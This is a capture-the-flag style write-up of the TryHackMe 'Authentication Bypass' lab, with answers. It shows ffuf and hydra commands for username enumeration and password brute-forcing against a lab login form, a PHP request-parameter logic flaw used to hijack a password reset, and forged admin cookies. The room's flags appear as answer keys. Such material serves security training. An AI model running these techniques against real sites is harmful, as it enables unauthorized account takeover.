---
description: https://tryhackme.com/room/authenticationbypass
---

# Authentication Bypass

## Task 2 Username Enumeration

![](<../../.gitbook/assets/Screenshot from 2022-03-04 09-45-57.png>)

```bash
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \
     -u http://10.10.19.145/customers/signup -X POST \
     -H "Content-Type: application/x-www-form-urlencoded"  \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -mr "username already exists"
```

![](<../../.gitbook/assets/Screenshot from 2022-03-04 09-58-35.png>)

#### What is the username starting with si\*\*\* ?

{% hint style="success" %}
`simon`
{% endhint %}

#### What is the username starting with st\*\*\* ?

{% hint style="success" %}
`steve`
{% endhint %}

#### What is the username starting with ro\*\*\*\* ?

{% hint style="success" %}
`robert`
{% endhint %}

## Task 3 Brute Force

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-16-51.png>)

#### What is the valid username and password?

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
     -u http://10.10.19.145/customers/login -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=W1&password=W2" \
     -fr "Invalid Username/Password Combination"
```

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-08-16.png>)

```bash
hydra -L valid_usernames.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
      'http-post-form://10.10.19.145/customers/login:username=^USER^&password=^PASS^:Invalid Username/Password Combination' \
      -I -t64
```

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-14-06.png>)

{% hint style="success" %}
`steve/thunder`
{% endhint %}

## Task 4 Logic Flaw

![robert@acmeitsupport.thm](<../../.gitbook/assets/Screenshot from 2022-03-04 10-22-04.png>)

![robert](<../../.gitbook/assets/Screenshot from 2022-03-04 10-42-04.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-42-54.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-26-09.png>)

The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favors POST data fields rather than the query string.

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-30-40.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-33-16.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-37-49.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-38-24.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-39-14.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-39-59.png>)

#### What is the flag from Robert's support ticket?

{% hint style="success" %}
`THM{AUTH_BYPASS_COMPLETE}`
{% endhint %}

## Task 5 Cookie Tampering

#### What is the flag from changing the plain text cookie values?

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-50-04.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-50-31.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-51-02.png>)

{% hint style="success" %}
`THM{COOKIE_TAMPERING}`
{% endhint %}

#### What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-55-04.png>)

{% hint style="success" %}
`463729`
{% endhint %}

#### What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?

```bash
echo -n 'VEhNe0JBU0U2NF9FTkNPRElOR30=' | base64 -d
```

![](<../../.gitbook/assets/Screenshot from 2022-03-04 10-58-31.png>)

{% hint style="success" %}
`THM{BASE64_ENCODING}`
{% endhint %}

#### Encode the following value using base64 {"id":1,"admin":true}

```bash
echo -n '{"id":1,"admin":true}' | base64 
```

![](<../../.gitbook/assets/Screenshot from 2022-03-04 11-00-15.png>)

{% hint style="success" %}
`eyJpZCI6MSwiYWRtaW4iOnRydWV9`
{% endhint %}
